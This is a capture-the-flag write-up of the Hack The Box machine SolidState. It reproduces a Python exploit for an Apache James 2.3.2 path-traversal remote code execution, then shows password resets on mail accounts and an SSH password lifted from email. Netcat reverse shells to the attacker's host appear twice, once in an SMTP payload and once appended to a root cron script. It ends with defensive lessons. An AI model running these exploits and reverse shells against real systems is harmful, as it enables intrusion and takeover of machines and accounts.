+<div class="highlight"><pre><span></span><span class="lineno" data-linenos=" 1 "></span>`#!/usr/bin/python
+<span class="lineno" data-linenos=" 2 "></span>#
+<span class="lineno" data-linenos=" 3 "></span># Exploit Title: Apache James Server 2.3.2 Authenticated User Remote Command Execution
+<span class="lineno" data-linenos=" 4 "></span># Date: 16\10\2014
+<span class="lineno" data-linenos=" 5 "></span># Exploit Author: Jakub Palaczynski, Marcin Woloszyn, Maciej Grabiec
+<span class="lineno" data-linenos=" 6 "></span># Vendor Homepage: http://james.apache.org/server/
+<span class="lineno" data-linenos=" 7 "></span># Software Link: http://ftp.ps.pl/pub/apache/james/server/apache-james-2.3.2.zip
+<span class="lineno" data-linenos=" 8 "></span># Version: Apache James Server 2.3.2
+<span class="lineno" data-linenos=" 9 "></span># Tested on: Ubuntu, Debian
+<span class="lineno" data-linenos="10 "></span># Info: This exploit works on default installation of Apache James Server 2.3.2
+<span class="lineno" data-linenos="11 "></span># Info: Example paths that will automatically execute payload on some action: /etc/bash_completion.d , /etc/pm/config.d
+<span class="lineno" data-linenos="12 "></span>
+<span class="lineno" data-linenos="13 "></span>import socket
+<span class="lineno" data-linenos="14 "></span>import sys
+<span class="lineno" data-linenos="15 "></span>import time
+<span class="lineno" data-linenos="16 "></span>
+<span class="lineno" data-linenos="17 "></span># specify payload
+<span class="lineno" data-linenos="18 "></span>#payload = &#39;touch /tmp/proof.txt&#39; # to exploit on any user
+<span class="lineno" data-linenos="19 "></span>payload = &#39;[ &quot;$(id -u)&quot; == &quot;0&quot; ] &amp;&amp; touch /root/proof.txt&#39; # to exploit only on root
+<span class="lineno" data-linenos="20 "></span># credentials to James Remote Administration Tool (Default - root/root)
+<span class="lineno" data-linenos="21 "></span>user = &#39;root&#39;
+<span class="lineno" data-linenos="22 "></span>pwd = &#39;root&#39;
+<span class="lineno" data-linenos="23 "></span>
+<span class="lineno" data-linenos="24 "></span>if len(sys.argv) != 2:
+<span class="lineno" data-linenos="25 "></span>    sys.stderr.write(&quot;[-]Usage: python %s &lt;ip&gt;\n&quot; % sys.argv[0])
+<span class="lineno" data-linenos="26 "></span>    sys.stderr.write(&quot;[-]Exemple: python %s 127.0.0.1\n&quot; % sys.argv[0])
+<span class="lineno" data-linenos="27 "></span>    sys.exit(1)
+<span class="lineno" data-linenos="28 "></span>
+<span class="lineno" data-linenos="29 "></span>ip = sys.argv[1]
+<span class="lineno" data-linenos="30 "></span>
+<span class="lineno" data-linenos="31 "></span>def recv(s):
+<span class="lineno" data-linenos="32 "></span>        s.recv(1024)
+<span class="lineno" data-linenos="33 "></span>        time.sleep(0.2)
+<span class="lineno" data-linenos="34 "></span>
+<span class="lineno" data-linenos="35 "></span>try:
+<span class="lineno" data-linenos="36 "></span>    print &quot;[+]Connecting to James Remote Administration Tool...&quot;
+<span class="lineno" data-linenos="37 "></span>    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+<span class="lineno" data-linenos="38 "></span>    s.connect((ip,4555))
+<span class="lineno" data-linenos="39 "></span>    s.recv(1024)
+<span class="lineno" data-linenos="40 "></span>    s.send(user + &quot;\n&quot;)
+<span class="lineno" data-linenos="41 "></span>    s.recv(1024)
+<span class="lineno" data-linenos="42 "></span>    s.send(pwd + &quot;\n&quot;)
+<span class="lineno" data-linenos="43 "></span>    s.recv(1024)
+<span class="lineno" data-linenos="44 "></span>    print &quot;[+]Creating user...&quot;
+<span class="lineno" data-linenos="45 "></span>    s.send(&quot;adduser ../../../../../../../../etc/bash_completion.d exploit\n&quot;)
+<span class="lineno" data-linenos="46 "></span>    s.recv(1024)
+<span class="lineno" data-linenos="47 "></span>    s.send(&quot;quit\n&quot;)
+<span class="lineno" data-linenos="48 "></span>    s.close()
+<span class="lineno" data-linenos="49 "></span>
+<span class="lineno" data-linenos="50 "></span>    print &quot;[+]Connecting to James SMTP server...&quot;
+<span class="lineno" data-linenos="51 "></span>    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+<span class="lineno" data-linenos="52 "></span>    s.connect((ip,25))
+<span class="lineno" data-linenos="53 "></span>    s.send(&quot;ehlo team@team.pl\r\n&quot;)
+<span class="lineno" data-linenos="54 "></span>    recv(s)
+<span class="lineno" data-linenos="55 "></span>    print &quot;[+]Sending payload...&quot;
+<span class="lineno" data-linenos="56 "></span>    s.send(&quot;mail from: &lt;&#39;@team.pl&gt;\r\n&quot;)
+<span class="lineno" data-linenos="57 "></span>    recv(s)
+<span class="lineno" data-linenos="58 "></span>    # also try s.send(&quot;rcpt to: &lt;../../../../../../../../etc/bash_completion.d@hostname&gt;\r\n&quot;) if the recipient cannot be found
+<span class="lineno" data-linenos="59 "></span>    s.send(&quot;rcpt to: &lt;../../../../../../../../etc/bash_completion.d&gt;\r\n&quot;)
+<span class="lineno" data-linenos="60 "></span>    recv(s)
+<span class="lineno" data-linenos="61 "></span>    s.send(&quot;data\r\n&quot;)
+<span class="lineno" data-linenos="62 "></span>    recv(s)
+<span class="lineno" data-linenos="63 "></span>    s.send(&quot;From: team@team.pl\r\n&quot;)
+<span class="lineno" data-linenos="64 "></span>    s.send(&quot;\r\n&quot;)
+<span class="lineno" data-linenos="65 "></span>    s.send(&quot;&#39;\n&quot;)
+<span class="lineno" data-linenos="66 "></span>    s.send(payload + &quot;\n&quot;)
+<span class="lineno" data-linenos="67 "></span>    s.send(&quot;\r\n.\r\n&quot;)
+<span class="lineno" data-linenos="68 "></span>    recv(s)
+<span class="lineno" data-linenos="69 "></span>    s.send(&quot;quit\r\n&quot;)
+<span class="lineno" data-linenos="70 "></span>    recv(s)
+<span class="lineno" data-linenos="71 "></span>    s.close()
+<span class="lineno" data-linenos="72 "></span>    print &quot;[+]Done! Payload will be executed once somebody logs in.&quot;
+<span class="lineno" data-linenos="73 "></span>except:
+<span class="lineno" data-linenos="74 "></span>    print &quot;Connection failed.&quot;`
+</pre></div>
+
+<p>After reviewing the script, I made a few notes:</p>
+<ol>
+<li>
+<p>This is an authenticated exploit, so we need credentials. The exploit uses the default credentials root/root that are probably shipped with the software. We’ll have to connect to the server to find out if these credentials are valid before we run this exploit.</p>
+</li>
+<li>
+<p>When running the exploit we have to pass the IP address as an argument. The script by default connects to port 4555 which is good since our server is running on that port.</p>
+</li>
+<li>
+<p>The script first creates a user with username “../../../../../../../../etc/bash_completion.d” and password “exploit”. It then connects to the SMTP server and sends that user a payload. Right off the bat, this doesn’t make much sense, so we’ll have to research the vulnerability.</p>
+</li>
+</ol>
+<p>After a bit of research we find that the vulnerability is in the <em>adduser</em> functionality. When a new user is added, the server creates a new subdirectory to store incoming and outgoing emails for that user. However, the username field is not properly validated. Therefore, when we’re creating a user with the username “../../../../../../../../etc/bash_completion.d”, any mail that gets sent to that user will be stored in that directory path. Why is that dangerous? Long story short, anything under the directory /etc/bash_completion.d is automatically loaded by Bash for all users! To learn more about bash completion scripts, refer to this <a href="https://iridakos.com/programming/2018/03/01/bash-programmable-completion-tutorial">article</a>.</p>
+<p>Therefore, if we create a user with a username that leads to the /etc/bash_completion.d directory, when we send an email to that user, our email gets saved in the bash_completion.d directory and the content of our email is automatically loaded by Bash when any user logs into the machine. So if we include a reverse shell in the email, all we have to do is wait for a single user to log in and we have access to the machine!</p>
+<p>Now that we’ve done our research, we’re ready to move on to the exploitation phase.</p>
+<h1 id="initial-foothold">Initial Foothold</h1>
+<p>First, let’s test the root/root credentials on the James Remote Admin server.</p>
+<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>root@kali:~/Desktop/htb/solidstate# nc 10.10.10.51 4555
+<span class="lineno" data-linenos="2 "></span>JAMES Remote Administration Tool 2.3.2
+<span class="lineno" data-linenos="3 "></span>Please enter your login and password
+<span class="lineno" data-linenos="4 "></span>Login id:
+<span class="lineno" data-linenos="5 "></span>root
+<span class="lineno" data-linenos="6 "></span>Password:
+<span class="lineno" data-linenos="7 "></span>root
+<span class="lineno" data-linenos="8 "></span>Welcome root. HELP for a list of commands
+</pre></div>
+
+<p>It works, good! List the available commands using the HELP command.</p>
+<div class="highlight"><pre><span></span><span class="lineno" data-linenos=" 1 "></span>HELP
+<span class="lineno" data-linenos=" 2 "></span>Currently implemented commands:
+<span class="lineno" data-linenos=" 3 "></span>help                                    display this help
+<span class="lineno" data-linenos=" 4 "></span>listusers                               display existing accounts
+<span class="lineno" data-linenos=" 5 "></span>countusers                              display the number of existing accounts
+<span class="lineno" data-linenos=" 6 "></span>adduser [username] [password]           add a new user
+<span class="lineno" data-linenos=" 7 "></span>verify [username]                       verify if specified user exist
+<span class="lineno" data-linenos=" 8 "></span>deluser [username]                      delete existing user
+<span class="lineno" data-linenos=" 9 "></span>setpassword [username] [password]       sets a user&#39;s password
+<span class="lineno" data-linenos="10 "></span>setalias [user] [alias]                 locally forwards all email for &#39;user&#39; to &#39;alias&#39;
+<span class="lineno" data-linenos="11 "></span>showalias [username]                    shows a user&#39;s current email alias
+<span class="lineno" data-linenos="12 "></span>unsetalias [user]                       unsets an alias for &#39;user&#39;
+<span class="lineno" data-linenos="13 "></span>setforwarding [username] [emailaddress] forwards a user&#39;s email to another email address
+<span class="lineno" data-linenos="14 "></span>showforwarding [username]               shows a user&#39;s current email forwarding
+<span class="lineno" data-linenos="15 "></span>unsetforwarding [username]              removes a forward
+<span class="lineno" data-linenos="16 "></span>user [repositoryname]                   change to another user repository
+<span class="lineno" data-linenos="17 "></span>shutdown                                kills the current JVM (convenient when James is run as a daemon)
+<span class="lineno" data-linenos="18 "></span>quit                                    close connection
+</pre></div>
+
+<p>Use the listusers command to display existing accounts.</p>
+<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>listusers
+<span class="lineno" data-linenos="2 "></span>Existing accounts 5
+<span class="lineno" data-linenos="3 "></span>user: james
+<span class="lineno" data-linenos="4 "></span>user: thomas
+<span class="lineno" data-linenos="5 "></span>user: john
+<span class="lineno" data-linenos="6 "></span>user: mindy
+<span class="lineno" data-linenos="7 "></span>user: mailadmin
+</pre></div>
+
+<p>We have 5 accounts. Since this is an admin account, we can set a user’s password and then access their account. If this was a real penetration test, you probably don’t want to do that. You’ll raise a lot of red flags when a bunch of users no longer can access their accounts. However, since this is a practice environment, I’m going to go all out. Let’s start by changing the mailadmin user’s account.</p>
+<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>setpassword mailadmin password
+<span class="lineno" data-linenos="2 "></span>Password for mailadmin reset
+</pre></div>
+
+<p>Now that we reset the password for the mailadmin account, let’s access his email using telnet.</p>
+<div class="highlight"><pre><span></span><span class="lineno" data-linenos=" 1 "></span>root@kali:~# telnet 10.10.10.51 110
+<span class="lineno" data-linenos=" 2 "></span>Trying 10.10.10.51...
+<span class="lineno" data-linenos=" 3 "></span>Connected to 10.10.10.51.
+<span class="lineno" data-linenos=" 4 "></span>Escape character is &#39;^]&#39;.
+<span class="lineno" data-linenos=" 5 "></span>+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready
+<span class="lineno" data-linenos=" 6 "></span>USER mailadmin
+<span class="lineno" data-linenos=" 7 "></span>+OK
+<span class="lineno" data-linenos=" 8 "></span>PASS password
+<span class="lineno" data-linenos=" 9 "></span>+OK Welcome mailadmin
+<span class="lineno" data-linenos="10 "></span>LIST
+<span class="lineno" data-linenos="11 "></span>+OK 0 0
+<span class="lineno" data-linenos="12 "></span>.
+</pre></div>
+
+<p>He does not have any mail. Next, I’m going to reset the passwords of all the other accounts.</p>
+<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>setpassword james password
+<span class="lineno" data-linenos="2 "></span>Password for james reset
+<span class="lineno" data-linenos="3 "></span>setpassword thomas password
+<span class="lineno" data-linenos="4 "></span>Password for thomas reset
+<span class="lineno" data-linenos="5 "></span>setpassword john password
+<span class="lineno" data-linenos="6 "></span>Password for john reset
+<span class="lineno" data-linenos="7 "></span>setpassword mindy password
+<span class="lineno" data-linenos="8 "></span>Password for mindy reset
+</pre></div>
+
+<p>James, Thomas and John didn’t have any emails too. Mindy on the other hand had two emails stored in her account.</p>
+<div class="highlight"><pre><span></span><span class="lineno" data-linenos=" 1 "></span>root@kali:~# telnet 10.10.10.51 110
+<span class="lineno" data-linenos=" 2 "></span>Trying 10.10.10.51...
+<span class="lineno" data-linenos=" 3 "></span>Connected to 10.10.10.51.
+<span class="lineno" data-linenos=" 4 "></span>Escape character is &#39;^]&#39;.
+<span class="lineno" data-linenos=" 5 "></span>+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready
+<span class="lineno" data-linenos=" 6 "></span>USER mindy
+<span class="lineno" data-linenos=" 7 "></span>+OK
+<span class="lineno" data-linenos=" 8 "></span>PASS password
+<span class="lineno" data-linenos=" 9 "></span>+OK Welcome mindy
+<span class="lineno" data-linenos="10 "></span>LIST
+<span class="lineno" data-linenos="11 "></span>+OK 2 1945
+<span class="lineno" data-linenos="12 "></span>1 1109
+<span class="lineno" data-linenos="13 "></span>2 836
+<span class="lineno" data-linenos="14 "></span>.
+<span class="lineno" data-linenos="15 "></span>RETR 1
+<span class="lineno" data-linenos="16 "></span>+OK Message follows
+<span class="lineno" data-linenos="17 "></span>Return-Path: &lt;mailadmin@localhost&gt;
+<span class="lineno" data-linenos="18 "></span>Message-ID: &lt;5420213.0.1503422039826.JavaMail.root@solidstate&gt;
+<span class="lineno" data-linenos="19 "></span>MIME-Version: 1.0
+<span class="lineno" data-linenos="20 "></span>Content-Type: text/plain; charset=us-ascii
+<span class="lineno" data-linenos="21 "></span>Content-Transfer-Encoding: 7bit
+<span class="lineno" data-linenos="22 "></span>Delivered-To: mindy@localhost
+<span class="lineno" data-linenos="23 "></span>Received: from 192.168.11.142 ([192.168.11.142])
+<span class="lineno" data-linenos="24 "></span>          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798
+<span class="lineno" data-linenos="25 "></span>          for &lt;mindy@localhost&gt;;
+<span class="lineno" data-linenos="26 "></span>          Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
+<span class="lineno" data-linenos="27 "></span>Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
+<span class="lineno" data-linenos="28 "></span>From: mailadmin@localhost
+<span class="lineno" data-linenos="29 "></span>Subject: Welcome
+<span class="lineno" data-linenos="30 "></span>
+<span class="lineno" data-linenos="31 "></span>Dear Mindy,
+<span class="lineno" data-linenos="32 "></span>Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.
+<span class="lineno" data-linenos="33 "></span>
+<span class="lineno" data-linenos="34 "></span>We are looking forward to you joining our team and your success at Solid State Security.
+<span class="lineno" data-linenos="35 "></span>
+<span class="lineno" data-linenos="36 "></span>Respectfully,
+<span class="lineno" data-linenos="37 "></span>James
+<span class="lineno" data-linenos="38 "></span>.
+<span class="lineno" data-linenos="39 "></span>RETR 2
+<span class="lineno" data-linenos="40 "></span>+OK Message follows
+<span class="lineno" data-linenos="41 "></span>Return-Path: &lt;mailadmin@localhost&gt;
+<span class="lineno" data-linenos="42 "></span>Message-ID: &lt;16744123.2.1503422270399.JavaMail.root@solidstate&gt;
+<span class="lineno" data-linenos="43 "></span>MIME-Version: 1.0
+<span class="lineno" data-linenos="44 "></span>Content-Type: text/plain; charset=us-ascii
+<span class="lineno" data-linenos="45 "></span>Content-Transfer-Encoding: 7bit
+<span class="lineno" data-linenos="46 "></span>Delivered-To: mindy@localhost
+<span class="lineno" data-linenos="47 "></span>Received: from 192.168.11.142 ([192.168.11.142])
+<span class="lineno" data-linenos="48 "></span>          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
+<span class="lineno" data-linenos="49 "></span>          for &lt;mindy@localhost&gt;;
+<span class="lineno" data-linenos="50 "></span>          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
+<span class="lineno" data-linenos="51 "></span>Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
+<span class="lineno" data-linenos="52 "></span>From: mailadmin@localhost
+<span class="lineno" data-linenos="53 "></span>Subject: Your Access
+<span class="lineno" data-linenos="54 "></span>
+<span class="lineno" data-linenos="55 "></span>Dear Mindy,
+<span class="lineno" data-linenos="56 "></span>
+<span class="lineno" data-linenos="57 "></span>Here are your ssh credentials to access the system. Remember to reset your password after your first login.
+<span class="lineno" data-linenos="58 "></span>Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path.
+<span class="lineno" data-linenos="59 "></span>
+<span class="lineno" data-linenos="60 "></span>username: mindy
+<span class="lineno" data-linenos="61 "></span>pass: P@55W0rd1!2@
+<span class="lineno" data-linenos="62 "></span>
+<span class="lineno" data-linenos="63 "></span>Respectfully,
+<span class="lineno" data-linenos="64 "></span>James
+</pre></div>
+
+<p>The first email was useless but the second email gives us SSH credentials! Let’s SSH into Mindy’s account.</p>
+<div class="highlight"><pre><span></span><span class="lineno" data-linenos=" 1 "></span>root@kali:~# ssh mindy@10.10.10.51
+<span class="lineno" data-linenos=" 2 "></span>The authenticity of host &#39;10.10.10.51 (10.10.10.51)&#39; can&#39;t be established.
+<span class="lineno" data-linenos=" 3 "></span>ECDSA key fingerprint is SHA256:njQxYC21MJdcSfcgKOpfTedDAXx50SYVGPCfChsGwI0.
+<span class="lineno" data-linenos=" 4 "></span>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+<span class="lineno" data-linenos=" 5 "></span>Warning: Permanently added &#39;10.10.10.51&#39; (ECDSA) to the list of known hosts.
+<span class="lineno" data-linenos=" 6 "></span>mindy@10.10.10.51&#39;s password:
+<span class="lineno" data-linenos=" 7 "></span>Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686
+<span class="lineno" data-linenos=" 8 "></span>
+<span class="lineno" data-linenos=" 9 "></span>The programs included with the Debian GNU/Linux system are free software;
+<span class="lineno" data-linenos="10 "></span>the exact distribution terms for each program are described in the
+<span class="lineno" data-linenos="11 "></span>individual files in /usr/share/doc/*/copyright.
+<span class="lineno" data-linenos="12 "></span>
+<span class="lineno" data-linenos="13 "></span>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+<span class="lineno" data-linenos="14 "></span>permitted by applicable law.
+<span class="lineno" data-linenos="15 "></span>Last login: Tue Aug 22 14:00:02 2017 from 192.168.11.142
+<span class="lineno" data-linenos="16 "></span>mindy@solidstate:~$ whoami
+<span class="lineno" data-linenos="17 "></span>-rbash: whoami: command not found
+</pre></div>
+
+<p>We’re in! However, we seem to be in a restricted bash shell (rbash). A restricted shell is a shell that restricts a user by blocking/restricting some of the commands. That’s why the “whoami” command didn’t work for us.</p>
+<p>The “ls” and “cat” commands work, so we can at least view the user.txt flag.</p>
+<p><img alt="" src="../../img/Solidstate Writeup wo Metasploit/1_nLY63rKrGS5cSJYalIg0rg.png" /></p>
+<p>There are several things you can do to try and break out of a restricted shell. I tried a bunch of them, but nothing worked. I’m not even allowed to change directories!</p>
+<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>mindy@solidstate:~$ cd /home
+<span class="lineno" data-linenos="2 "></span>-rbash: cd: restricted
+</pre></div>
+
+<p>We seem to have reached a dead end, so let’s go back to the RCE exploit we found earlier. I’m going to exploit this manually instead of using the script on exploitdb.</p>
+<p>Log back into the James Remote Admin server and create a user with the username “../../../../../../../../etc/bash_completion.d” and password “password”.</p>
+<div class="highlight"><pre><span></span><span class="lineno" data-linenos=" 1 "></span>root@kali:~/Desktop/htb/solidstate# nc 10.10.10.51 4555
+<span class="lineno" data-linenos=" 2 "></span>JAMES Remote Administration Tool 2.3.2
+<span class="lineno" data-linenos=" 3 "></span>Please enter your login and password
+<span class="lineno" data-linenos=" 4 "></span>Login id:
+<span class="lineno" data-linenos=" 5 "></span>root
+<span class="lineno" data-linenos=" 6 "></span>Password:
+<span class="lineno" data-linenos=" 7 "></span>root
+<span class="lineno" data-linenos=" 8 "></span>Welcome root. HELP for a list of commands
+<span class="lineno" data-linenos=" 9 "></span>adduser ../../../../../../../../etc/bash_completion.d password
+<span class="lineno" data-linenos="10 "></span>User ../../../../../../../../etc/bash_completion.d added
+</pre></div>
+
+<p>Now let’s send this user an email that contains a reverse shell.</p>
+<div class="highlight"><pre><span></span><span class="lineno" data-linenos=" 1 "></span>root@kali:~# telnet 10.10.10.51 25
+<span class="lineno" data-linenos=" 2 "></span>Trying 10.10.10.51...
+<span class="lineno" data-linenos=" 3 "></span>Connected to 10.10.10.51.
+<span class="lineno" data-linenos=" 4 "></span>Escape character is &#39;^]&#39;.
+<span class="lineno" data-linenos=" 5 "></span>220 solidstate SMTP Server (JAMES SMTP Server 2.3.2) ready Mon, 30 Dec 2019 17:10:56 -0500 (EST)
+<span class="lineno" data-linenos=" 6 "></span>EHLO bla.bla
+<span class="lineno" data-linenos=" 7 "></span>250-solidstate Hello bla.bla (10.10.14.12 [10.10.14.12])
+<span class="lineno" data-linenos=" 8 "></span>250-PIPELINING
+<span class="lineno" data-linenos=" 9 "></span>250 ENHANCEDSTATUSCODES
+<span class="lineno" data-linenos="10 "></span>MAIL FROM: &lt;&#39;[random@random.com](mailto:random@random.com)&gt;
+<span class="lineno" data-linenos="11 "></span>250 2.1.0 Sender &lt;&#39;[random@random.com](mailto:random@random.com)&gt; OK
+<span class="lineno" data-linenos="12 "></span>RCPT TO: &lt;../../../../../../../../etc/bash_completion.d&gt;
+<span class="lineno" data-linenos="13 "></span>250 2.1.5 Recipient &lt;../../../../../../../../etc/bash_completion.d@localhost&gt; OK
+<span class="lineno" data-linenos="14 "></span>DATA
+<span class="lineno" data-linenos="15 "></span>354 Ok Send data ending with &lt;CRLF&gt;.&lt;CRLF&gt;
+<span class="lineno" data-linenos="16 "></span>FROM: bla.bla
+<span class="lineno" data-linenos="17 "></span>&#39;
+<span class="lineno" data-linenos="18 "></span>/bin/nc -e /bin/bash 10.10.14.12 1234
+<span class="lineno" data-linenos="19 "></span>.
+<span class="lineno" data-linenos="20 "></span>250 2.6.0 Message received
+<span class="lineno" data-linenos="21 "></span>quit
+<span class="lineno" data-linenos="22 "></span>221 2.0.0 solidstate Service closing transmission channel
+<span class="lineno" data-linenos="23 "></span>Connection closed by foreign host.
+</pre></div>
+
+<p>If you’re not familiar with using telnet for SMTP communication, refer to this <a href="https://docs.microsoft.com/en-us/exchange/mail-flow/test-smtp-with-telnet?view=exchserver-2019">guide</a>. One thing to note is the single quote we added in the MAIL FROM field and after the FROM field. This is so that the file is interpreted properly at the backend and our reverse shell runs.</p>
+<p>Next, set up a listener to receive the reverse shell.</p>
+<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>nc -nlvp 1234
+</pre></div>
+
+<p>Then SSH into Mindy’s account so that the content of the bash_completion directory is loaded.</p>
+<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>ssh mindy@10.10.10.51
+</pre></div>
+
+<p>We get a shell that’s no longer restricted by the rbash shell!</p>
+<p><img alt="" src="../../img/Solidstate Writeup wo Metasploit/1_-g9cs4Y3RIcMG88e3yREnQ.png" /></p>
+<p>Let’s upgrade it to a better shell.</p>
+<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;
+</pre></div>
+
+<p>This gives us a partially interactive bash shell. To get a fully interactive shell, background the session (CTRL+ Z) and run the following in your terminal which tells your terminal to pass keyboard shortcuts to the shell.</p>
+<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>stty raw -echo
+</pre></div>
+
+<p>Once that is done, run the command “fg” to bring netcat back to the foreground.</p>
+<p>Now we need to escalate privileges.</p>
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+<p>Let’s transfer the LinEnum script from our attack machine to the target machine.</p>
+<p>In the attack machine, start up a server in the same directory that the script resides in.</p>
+<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>python -m SimpleHTTPServer 5555
+</pre></div>
+
+<p>In the target machine, move to the /tmp directory where we have write privileges and download the LinEnum script.</p>
+<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>cd /tmp
+<span class="lineno" data-linenos="2 "></span>wget [http://10.10.14.12:5555/LinEnum.sh](http://10.10.14.6:5555/LinEnum.sh)
+</pre></div>
+
+<p>Give it execute privileges.</p>
+<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>chmod +x LinEnum.sh
+</pre></div>
+
+<p>Run the script.</p>
+<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>./LinEnum.sh
+</pre></div>
+
+<p>We don’t get anything useful. Next, let’s try pspy. If you don’t have the script, you can download it from the following github repository.</p>
+<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>[https://github.com/DominicBreuker/pspy](https://github.com/DominicBreuker/pspy)
+</pre></div>
+
+<p>We know that the system is a 32 bit system so make sure you run pspy32. Upload it and run it on the attack machine in the same way we did for LinEnum.</p>
+<p>After a minute we see an interesting process pop up.</p>
+<p><img alt="" src="../../img/Solidstate Writeup wo Metasploit/1_Xz8gUedVbeUPuZEP-wmVHg.png" /></p>
+<p>If you view the permissions on the /opt/tmp.py file, you’ll see that everyone has read/write/execute privileges on it.</p>
+<p><img alt="" src="../../img/Solidstate Writeup wo Metasploit/1_DIhulL7pCEZPfrsVwUe24w.png" /></p>
+<p>Therefore all we need to do is change the content of the file to send a reverse shell to our attack machine and then we simply wait for the cron job to send a privileged shell back.</p>
+<p>Change the content of the file to send a reverse shell to our attack machine.</p>
+<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>echo &quot;os.system(&#39;/bin/nc -e /bin/bash 10.10.14.12 7777&#39;)&quot; &gt;&gt; /opt/tmp.py
+</pre></div>
+
+<p>Set up a listener to receive the reverse shell.</p>
+<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>nc -nlvp 7777
+</pre></div>
+
+<p>Wait a minute for the cron job to run.</p>
+<p><img alt="" src="../../img/Solidstate Writeup wo Metasploit/1_ynxb5W6Wt8xB3sPlZDYZRg.png" /></p>
+<p>We have a shell! Grab the root.txt flag.</p>
+<p><img alt="" src="../../img/Solidstate Writeup wo Metasploit/1_YCIcKSYTe77zalgSqIfAag.png" /></p>
+<h1 id="lessons-learned">Lessons Learned</h1>
+<p>To gain an initial foothold on the box we exploited three vulnerabilities.</p>
+<ol>
+<li>
+<p>Use of default credentials. The administrator used the default password that is shipped with the application. Since default credentials are publicly available and can be easily obtained, the user should have instead used a sufficiently long password that is difficult to crack.</p>
+</li>
+<li>
+<p>Information disclosure. SSH credentials are stored in plaintext in one of the user’s emails. If it is necessary that the password be transmitted by email, the user should have changed the password upon the first login.</p>
+</li>
+<li>
+<p>A Remote Code Execution (RCE) vulnerability with the James Remote server that allowed us to gain initial access to the machine. This could have been avoided if the user had patched the system and installed the most recent version of the software.</p>
+</li>
+</ol>
+<p>To escalate privileges we exploited one vulnerability.</p>
+<ol>
+<li>A security misconfiguration of file permissions. There was a scheduled task that ran a file with root privileges although everyone had write access to that file. This allowed us to change the content of the file and get a privileged reverse shell sent back to our attack machine. To avoid this vulnerability, the file permissions should have been restricted to only root level access.</li>
+</ol>
+<h1 id="conclusion">Conclusion</h1>
+<p>19 machines down, 28 more to go!</p>
+<p><img alt="" src="../../img/Solidstate Writeup wo Metasploit/1_mUYS-xv2aqpHOOc_1WssIQ.png" /></p>
+                
+                  
+                
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid">
+        
+          <a href="../Sunday Writeup wo Metasploit/" title="27. Sunday Writeup w/o Metasploit.md" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
+            </div>
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  Previous
+                </span>
+                27. Sunday Writeup w/o Metasploit.md
+              </span>
+            </div>
+          </a>
+        
+        
+          <a href="../Celestial Writeup/" title="29. Celestial Writeup.md" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  Next
+                </span>
+                29. Celestial Writeup.md
+              </span>
+            </div>
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
+            </div>
+          </a>
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+          <div class="md-footer-copyright__highlight">
+            Built by <a href="http://github.com/rushic24">Rushi</a> &copy; 2020
+          </div>
+        
+        powered by
+        <a href="https://www.mkdocs.org">MkDocs</a>
+        and
+        <a href="https://squidfunk.github.io/mkdocs-material/">
+          Material for MkDocs</a>
+      </div>
+      
+  <div class="md-footer-social">
+    <link rel="stylesheet" href="../../assets/fonts/font-awesome.css">
+    
+      <a href="https://github.com/rushic24" class="md-footer-social__link fa fa-"></a>
+    
+      <a href="https://www.linkedin.com/in/rushichaudhari" class="md-footer-social__link fa fa-"></a>
+    
+      <a href="" class="md-footer-social__link fa fa-"></a>
+    
+  </div>
+
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../../assets/javascripts/application.808e90bb.js"></script>
+      
